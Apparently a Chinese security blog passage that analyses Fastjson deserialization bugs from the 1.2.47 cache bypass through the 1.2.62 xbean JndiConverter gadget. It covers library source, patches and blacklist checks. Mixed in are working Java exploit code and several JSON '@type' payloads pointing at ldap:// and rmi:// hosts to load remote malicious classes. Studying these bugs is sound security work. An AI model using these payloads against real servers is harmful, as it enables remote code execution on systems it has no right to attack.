class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;java.util.Collections$EmptyMap&quot;</span>.equals(typeName)) &#123;</span><br><span class="line">                                instance = Collections.emptyMap();</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                instance = clazz.newInstance();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>在进行初始化的时候，它会把对应类所对应的反序列化器放进去</p>
<p>其中很多都用的是<code>MiscCodec</code>的反序列化器，Class.class就是它</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="title function_">ParserConfig</span><span class="params">(ASMDeserializerFactory asmFactory, ClassLoader parentClassLoader)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (asmFactory == <span class="literal">null</span> &amp;&amp; !ASMUtils.IS_ANDROID) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (parentClassLoader == <span class="literal">null</span>) &#123;</span><br><span class="line">                    asmFactory = <span class="keyword">new</span> <span class="title class_">ASMDeserializerFactory</span>(<span class="keyword">new</span> <span class="title class_">ASMClassLoader</span>());</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    asmFactory = <span class="keyword">new</span> <span class="title class_">ASMDeserializerFactory</span>(parentClassLoader);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ExceptionInInitializerError error) &#123;</span><br><span class="line">                <span class="comment">// skip</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (AccessControlException error) &#123;</span><br><span class="line">                <span class="comment">// skip</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoClassDefFoundError error) &#123;</span><br><span class="line">                <span class="comment">// skip</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.asmFactory = asmFactory;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (asmFactory == <span class="literal">null</span>) &#123;</span><br><span class="line">            asmEnable = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        deserializers.put(SimpleDateFormat.class, MiscCodec.instance);</span><br><span class="line">        deserializers.put(java.sql.Timestamp.class, SqlDateDeserializer.instance_timestamp);</span><br><span class="line">        deserializers.put(java.sql.Date.class, SqlDateDeserializer.instance);</span><br><span class="line">        deserializers.put(java.sql.Time.class, TimeDeserializer.instance);</span><br><span class="line">        deserializers.put(java.util.Date.class, DateCodec.instance);</span><br><span class="line">        deserializers.put(Calendar.class, CalendarCodec.instance);</span><br><span class="line">        deserializers.put(XMLGregorianCalendar.class, CalendarCodec.instance);</span><br><span class="line"></span><br><span class="line">        deserializers.put(JSONObject.class, MapDeserializer.instance);</span><br><span class="line">        deserializers.put(JSONArray.class, CollectionCodec.instance);</span><br><span class="line"></span><br><span class="line">        deserializers.put(Map.class, MapDeserializer.instance);</span><br><span class="line">        deserializers.put(HashMap.class, MapDeserializer.instance);</span><br><span class="line">        deserializers.put(LinkedHashMap.class, MapDeserializer.instance);</span><br><span class="line">        deserializers.put(TreeMap.class, MapDeserializer.instance);</span><br><span class="line">        deserializers.put(ConcurrentMap.class, MapDeserializer.instance);</span><br><span class="line">        deserializers.put(ConcurrentHashMap.class, MapDeserializer.instance);</span><br><span class="line"></span><br><span class="line">        deserializers.put(Collection.class, CollectionCodec.instance);</span><br><span class="line">        deserializers.put(List.class, CollectionCodec.instance);</span><br><span class="line">        deserializers.put(ArrayList.class, CollectionCodec.instance);</span><br><span class="line"></span><br><span class="line">        deserializers.put(Object.class, JavaObjectDeserializer.instance);</span><br><span class="line">        deserializers.put(String.class, StringCodec.instance);</span><br><span class="line">        deserializers.put(StringBuffer.class, StringCodec.instance);</span><br><span class="line">        deserializers.put(StringBuilder.class, StringCodec.instance);</span><br><span class="line">        deserializers.put(<span class="type">char</span>.class, CharacterCodec.instance);</span><br><span class="line">        deserializers.put(Character.class, CharacterCodec.instance);</span><br><span class="line">        deserializers.put(<span class="type">byte</span>.class, NumberDeserializer.instance);</span><br><span class="line">        deserializers.put(Byte.class, NumberDeserializer.instance);</span><br><span class="line">        deserializers.put(<span class="type">short</span>.class, NumberDeserializer.instance);</span><br><span class="line">        deserializers.put(Short.class, NumberDeserializer.instance);</span><br><span class="line">        deserializers.put(<span class="type">int</span>.class, IntegerCodec.instance);</span><br><span class="line">        deserializers.put(Integer.class, IntegerCodec.instance);</span><br><span class="line">        deserializers.put(<span class="type">long</span>.class, LongCodec.instance);</span><br><span class="line">        deserializers.put(Long.class, LongCodec.instance);</span><br><span class="line">        deserializers.put(BigInteger.class, BigIntegerCodec.instance);</span><br><span class="line">        deserializers.put(BigDecimal.class, BigDecimalCodec.instance);</span><br><span class="line">        deserializers.put(<span class="type">float</span>.class, FloatCodec.instance);</span><br><span class="line">        deserializers.put(Float.class, FloatCodec.instance);</span><br><span class="line">        deserializers.put(<span class="type">double</span>.class, NumberDeserializer.instance);</span><br><span class="line">        deserializers.put(Double.class, NumberDeserializer.instance);</span><br><span class="line">        deserializers.put(<span class="type">boolean</span>.class, BooleanCodec.instance);</span><br><span class="line">        deserializers.put(Boolean.class, BooleanCodec.instance);</span><br><span class="line">        deserializers.put(Class.class, MiscCodec.instance);</span><br><span class="line">        deserializers.put(<span class="type">char</span>[].class, <span class="keyword">new</span> <span class="title class_">CharArrayCodec</span>());</span><br><span class="line"></span><br><span class="line">        deserializers.put(AtomicBoolean.class, BooleanCodec.instance);</span><br><span class="line">        deserializers.put(AtomicInteger.class, IntegerCodec.instance);</span><br><span class="line">        deserializers.put(AtomicLong.class, LongCodec.instance);</span><br><span class="line">        deserializers.put(AtomicReference.class, ReferenceCodec.instance);</span><br><span class="line"></span><br><span class="line">        deserializers.put(WeakReference.class, ReferenceCodec.instance);</span><br><span class="line">        deserializers.put(SoftReference.class, ReferenceCodec.instance);</span><br><span class="line"></span><br><span class="line">        deserializers.put(UUID.class, MiscCodec.instance);</span><br><span class="line">        deserializers.put(TimeZone.class, MiscCodec.instance);</span><br><span class="line">        deserializers.put(Locale.class, MiscCodec.instance);</span><br><span class="line">        deserializers.put(Currency.class, MiscCodec.instance);</span><br><span class="line">        deserializers.put(InetAddress.class, MiscCodec.instance);</span><br><span class="line">        deserializers.put(Inet4Address.class, MiscCodec.instance);</span><br><span class="line">        deserializers.put(Inet6Address.class, MiscCodec.instance);</span><br><span class="line">        deserializers.put(InetSocketAddress.class, MiscCodec.instance);</span><br><span class="line">        deserializers.put(File.class, MiscCodec.instance);</span><br><span class="line">        deserializers.put(URI.class, MiscCodec.instance);</span><br><span class="line">        deserializers.put(URL.class, MiscCodec.instance);</span><br><span class="line">        deserializers.put(Pattern.class, MiscCodec.instance);</span><br><span class="line">        deserializers.put(Charset.class, MiscCodec.instance);</span><br><span class="line">        deserializers.put(JSONPath.class, MiscCodec.instance);</span><br><span class="line">        deserializers.put(Number.class, NumberDeserializer.instance);</span><br><span class="line">        deserializers.put(AtomicIntegerArray.class, AtomicCodec.instance);</span><br><span class="line">        deserializers.put(AtomicLongArray.class, AtomicCodec.instance);</span><br><span class="line">        deserializers.put(StackTraceElement.class, StackTraceElementDeserializer.instance);</span><br><span class="line"></span><br><span class="line">        deserializers.put(Serializable.class, JavaObjectDeserializer.instance);</span><br><span class="line">        deserializers.put(Cloneable.class, JavaObjectDeserializer.instance);</span><br><span class="line">        deserializers.put(Comparable.class, JavaObjectDeserializer.instance);</span><br><span class="line">        deserializers.put(Closeable.class, JavaObjectDeserializer.instance);</span><br><span class="line"></span><br><span class="line">        addItemsToDeny(DENYS);</span><br><span class="line">        addItemsToAccept(AUTO_TYPE_ACCEPT_LIST);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这里这个流程就走完了，我们加载<code>Class.class</code>，使用<code>MiscCodec</code>反序列化器，调用<code>loadClass</code>，将类名传入，并放入缓冲区中</p>
<p>当我们再次对类进行加载的时候，就直接从缓存中返回类</p>
<h3 id="YoAWe">实现</h3>
第一步 反序列化一个Class类，值为恶意类

<p>第二步 接着用之前的payload</p>
<p>加载第一个Class类时候设置类为Class类，后面的参数名就叫<code>val</code>即可，若不为它就会报错</p>
<p>第二个类直接使用之前payload即可</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Fastjson1227</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;&#123;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;&#125;,&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;DataSourceName\&quot;:\&quot;ldap://127.0.0.1:8085/KemDnGOe\&quot;,\&quot;autoCommit\&quot;:false&#125;&#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后成功加载恶意类</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1737119364990-83c943df-7792-4805-9c0e-0ce6476027c5.png"></p>
<h3 id="rgAg9">补丁分析</h3>
由于1.2.47这个洞能够在不开启AutoTypeSupport实现RCE，因此危害十分巨大，我们看看是怎样修的

<p>1.2.48中的修复措施是，在loadClass()时，将缓存开关默认置为False，所以默认是不能通过Class加载进缓存了。同时将Class类加入到了黑名单中。调试分析，在调用TypeUtils.loadClass()时中，缓存开关cache默认设置为了False，对比下两个版本的就知道了。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1.2.47</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) &#123;</span><br><span class="line">        <span class="keyword">return</span> loadClass(className, classLoader, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//1.2.48</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) &#123;</span><br><span class="line">        <span class="keyword">return</span> loadClass(className, classLoader, <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="wpn7g">Fastjson <= 1.2.61 通杀</h2>
<h3 id="wndOB">Fastjson1.2.5 <= 1.2.59</h3>
+ 需要开启AutoType

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.zaxxer.hikari.HikariConfig&quot;</span>,<span class="string">&quot;metricRegistry&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>&#125;</span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.zaxxer.hikari.HikariConfig&quot;</span>,<span class="string">&quot;healthCheckRegistry&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ozmxv">Fastjson1.2.5 <= 1.2.60</h3>
+ 需要开启AutoType

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;oracle.jdbc.connector.OracleManagedConnectionFactory&quot;</span>,<span class="string">&quot;xaDataSourceName&quot;</span>:<span class="string">&quot;rmi://10.10.20.166:1099/ExportObject&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.configuration.JNDIConfiguration&quot;</span>,<span class="string">&quot;prefix&quot;</span>:<span class="string">&quot;ldap://10.10.20.166:1389/ExportObject&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<h3 id="dLpkB">Fastjson1.2.5 <= 1.2.60</h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.proxy.provider.remoting.SessionBeanProvider&quot;</span>,<span class="string">&quot;jndiName&quot;</span>:<span class="string">&quot;ldap://localhost:1389/ExportObject&quot;</span>&#125;</span><br></pre></td></tr></table></figure>





]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>FastJson</tag>
      </tags>
  </entry>
  <entry>
    <title>FastJson 1.2.62-1.2.68反序列化漏洞</title>
    <url>/2025/03/18/FastJson1-2-62-1-2-68%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="mxJnr">FastJson 1.2.62-1.2.68反序列化漏洞</h1>
今天学习一下FastJson 中 1.2.62 - 1.2.68 的反序列化漏洞，思路的话和之前一样基于黑名单的绕过，但是大部分还是在 AutoType 开启的情况下，且基本都基于存在其他的依赖的条件下

<h2 id="Otftt">1.2.62 反序列化漏洞</h2>
<h3 id="evyuq">1.2.62 反序列化前提条件</h3>

<ul>
<li>需要开启AutoType</li>
<li>FastJson &lt;&#x3D; 1.2.62 </li>
<li>JNDI注入可利用的 JDK 版本</li>
<li>目标服务端需要存在xbean-reflect包，xbean-reflect 包的版本不限</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;  </span><br><span class="line">         &lt;groupId&gt;com.alibaba&lt;/groupId&gt;  </span><br><span class="line">         &lt;artifactId&gt;fastjson&lt;/artifactId&gt;  </span><br><span class="line">         &lt;version&gt;<span class="number">1.2</span><span class="number">.62</span>&lt;/version&gt;  </span><br><span class="line">    &lt;/dependency&gt;  </span><br><span class="line">    &lt;dependency&gt;  </span><br><span class="line">         &lt;groupId&gt;org.apache.xbean&lt;/groupId&gt;  </span><br><span class="line">         &lt;artifactId&gt;xbean-reflect&lt;/artifactId&gt;  </span><br><span class="line">         &lt;version&gt;<span class="number">4.18</span>&lt;/version&gt;  </span><br><span class="line">    &lt;/dependency&gt;  </span><br><span class="line">    &lt;dependency&gt;  </span><br><span class="line">        &lt;groupId&gt;commons-collections&lt;/groupId&gt;  </span><br><span class="line">        &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;  </span><br><span class="line">        &lt;version&gt;<span class="number">3.2</span><span class="number">.1</span>&lt;/version&gt;  </span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure>

<h3 id="GJ9xD">漏洞原理分析</h3>
<h4 id="cg9NB">逆向分析</h4>
漏洞存在在`org.apache.xbean.propertyeditor.JndiConverter`中的`toObjectImpl`方法中

<p>但是他不是一个setter或者getter方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">toObjectImpl</span><span class="params">(String text)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InitialContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">            <span class="keyword">return</span> (Context) context.lookup(text);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">PropertyEditorException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>向上找，在<code>AbstractConverter#toObject</code>中调用了该方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> Object <span class="title function_">toObject</span><span class="params">(String text)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (text == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> toObjectImpl((trim) ? text.trim() : text);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>继续找的话，我们找到了一个getter方法和一个setter方法，但似乎这个getter方法并不是一个满足条件的getter方法（无参数），因此我们可以看<code>AbstractConverter</code>中的<code>setAsTest</code>方法</p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/44744277/1741924052265-b71c177a-68c1-4b2a-9b69-1a9b113c5024.png"></p>
<p>其中<code>setAsTest</code>方法源码如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">setAsText</span><span class="params">(String text)</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> toObject((trim) ? text.trim() : text);</span><br><span class="line">        <span class="built_in">super</span>.setValue(value);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="vaUmG">正向分析</h4>
当我们调用`JndiConverter`的`setAsText`方法时，它本身没有该方法，就会调用父类的`setAsText`

<p>方法，他的父类正好是<code>AbstractConverter</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JndiConverter</span> <span class="keyword">extends</span> <span class="title class_">AbstractConverter</span></span><br></pre></td></tr></table></figure>

<p>这里会调用<code>toObject</code>方法，该方法调用<code>toObject</code>方法，最后<code>toObject</code>调用<code>toObjectImpl</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">setAsText</span><span class="params">(String text)</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> toObject((trim) ? text.trim() : text);</span><br><span class="line">        <span class="built_in">super</span>.setValue(value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> Object <span class="title function_">toObject</span><span class="params">(String text)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (text == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> toObjectImpl((trim) ? text.trim() : text);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>在<code>AbstractConverter</code>中没有<code>toObjectImpl</code>，所以这里调用到<code>JndiConverter</code>的<code>toObjectImpl</code>方法，就触发了JNDI注入</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">toObjectImpl</span><span class="params">(String text)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InitialContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">            <span class="keyword">return</span> (Context) context.lookup(text);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">PropertyEditorException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="k71ri">EXP编写</h3>
EXP如下，记得要开启AutoType哟

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.xbean.propertyeditor.JndiConverter\&quot;,\&quot;asText\&quot;:\&quot;ldap://127.0.0.1:8085/JlaYFplQ\&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(s);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>运行后</p>
<h4 id="VKh2j">![](https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741925535544-0ab2c0da-6f61-4042-a6a9-7fcb37bfe8b0.png)</h4>
<h3 id="mhCJS">调试分析</h3>
我们进入`CheckAutoType`中，对里面的一些过滤进行以下分析，有以下几个新的限制

<ul>
<li><code>@type</code>类名长度</li>
<li>expectClass参数的类型匹配</li>
<li><code>[</code>检测</li>
<li><code>L</code>检测</li>
<li><code>LL</code>检测</li>
<li>通过计算hash与白名单进行匹配</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (typeName == <span class="literal">null</span>) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 限制了JSON中@type指定的类名长度</span></span><br><span class="line">      <span class="keyword">if</span> (typeName.length() &gt;= <span class="number">192</span> || typeName.length() &lt; <span class="number">3</span>) &#123;</span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 单独对expectClass参数进行判断，设置expectClassFlag的值</span></span><br><span class="line"><span class="comment">// 当且仅当expectClass参数不为空且不为Object、Serializable、...等类类型时expectClassFlag才为true</span></span><br><span class="line">      <span class="keyword">final</span> <span class="type">boolean</span> expectClassFlag;</span><br><span class="line">      <span class="keyword">if</span> (expectClass == <span class="literal">null</span>) &#123;</span><br><span class="line">          expectClassFlag = <span class="literal">false</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">if</span> (expectClass == Object.class</span><br><span class="line">                  || expectClass == Serializable.class</span><br><span class="line">                  || expectClass == Cloneable.class</span><br><span class="line">                  || expectClass == Closeable.class</span><br><span class="line">                  || expectClass == EventListener.class</span><br><span class="line">                  || expectClass == Iterable.class</span><br><span class="line">                  || expectClass == Collection.class</span><br><span class="line">                  ) &#123;</span><br><span class="line">              expectClassFlag = <span class="literal">false</span>;</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              expectClassFlag = <span class="literal">true</span>;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line">      <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> typeName.replace(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">      Class&lt;?&gt; clazz = <span class="literal">null</span>;</span><br><span class="line"> </span><br><span class="line">      <span class="keyword">final</span> <span class="type">long</span> <span class="variable">BASIC</span> <span class="operator">=</span> <span class="number">0xcbf29ce484222325L</span>;</span><br><span class="line">      <span class="keyword">final</span> <span class="type">long</span> <span class="variable">PRIME</span> <span class="operator">=</span> <span class="number">0x100000001b3L</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 1.2.43检测，&quot;[&quot;</span></span><br><span class="line">      <span class="keyword">final</span> <span class="type">long</span> <span class="variable">h1</span> <span class="operator">=</span> (BASIC ^ className.charAt(<span class="number">0</span>)) * PRIME;</span><br><span class="line">      <span class="keyword">if</span> (h1 == <span class="number">0xaf64164c86024f1aL</span>) &#123; <span class="comment">// [</span></span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 1.2.41检测，&quot;Lxx;&quot;</span></span><br><span class="line">      <span class="keyword">if</span> ((h1 ^ className.charAt(className.length() - <span class="number">1</span>)) * PRIME == <span class="number">0x9198507b5af98f0L</span>) &#123;</span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 1.2.42检测，&quot;LL&quot;</span></span><br><span class="line">      <span class="keyword">final</span> <span class="type">long</span> <span class="variable">h3</span> <span class="operator">=</span> (((((BASIC ^ className.charAt(<span class="number">0</span>))</span><br><span class="line">              * PRIME)</span><br><span class="line">              ^ className.charAt(<span class="number">1</span>))</span><br><span class="line">              * PRIME)</span><br><span class="line">              ^ className.charAt(<span class="number">2</span>))</span><br><span class="line">              * PRIME;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 对类名进行Hash计算并查找该值是否在INTERNAL_WHITELIST_HASHCODES即内部白名单中，若在则internalWhite为true</span></span><br><span class="line">      <span class="type">boolean</span> <span class="variable">internalWhite</span> <span class="operator">=</span> Arrays.binarySearch(INTERNAL_WHITELIST_HASHCODES,</span><br><span class="line">              TypeUtils.fnv1a_64(className)</span><br><span class="line">      ) &gt;= <span class="number">0</span>;</span><br></pre></td></tr></table></figure>

<p>继续向下，internalWhite为false , 当我们开启autoTypeSupport时，就会走入下面的逻辑</p>
<p>首先通过hash进行白名单匹配，后续进行黑名单过滤</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!internalWhite &amp;&amp; (<span class="built_in">this</span>.autoTypeSupport || expectClassFlag)) &#123;</span><br><span class="line">                hash = h3;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span>(mask = <span class="number">3</span>; mask &lt; className.length(); ++mask) &#123;</span><br><span class="line">                    hash ^= (<span class="type">long</span>)className.charAt(mask);</span><br><span class="line">                    hash *= <span class="number">1099511628211L</span>;</span><br><span class="line">                    <span class="keyword">if</span> (Arrays.binarySearch(<span class="built_in">this</span>.acceptHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                        clazz = TypeUtils.loadClass(typeName, <span class="built_in">this</span>.defaultClassLoader, <span class="literal">true</span>);</span><br><span class="line">                        <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">                            <span class="keyword">return</span> clazz;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (Arrays.binarySearch(<span class="built_in">this</span>.denyHashCodes, hash) &gt;= <span class="number">0</span> &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>因为并没有被黑名单过滤，所以我们走到了这里</p>
<p><code>autoTypeSupport</code>为true，因此我们不会走到if代码中并抛出异常，而是会走出if判断</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="built_in">this</span>.autoTypeSupport) &#123;</span><br><span class="line">                hash = h3;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span>(mask = <span class="number">3</span>; mask &lt; className.length(); ++mask) &#123;</span><br><span class="line">                    <span class="type">char</span> <span class="variable">c</span> <span class="operator">=</span> className.charAt(mask);</span><br><span class="line">                    hash ^= (<span class="type">long</span>)c;</span><br><span class="line">                    hash *= <span class="number">1099511628211L</span>;</span><br><span class="line">                    <span class="keyword">if</span> (Arrays.binarySearch(<span class="built_in">this</span>.denyHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (Arrays.binarySearch(<span class="built_in">this</span>.acceptHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">                            clazz = TypeUtils.loadClass(typeName, <span class="built_in">this</span>.defaultClassLoader, <span class="literal">true</span>);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (expectClass != <span class="literal">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">return</span> clazz;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>我们在后面的代码中就会执行<code>loadClass</code>方法，最后遍历调用setter与getter方法，最终执行恶意代码</p>
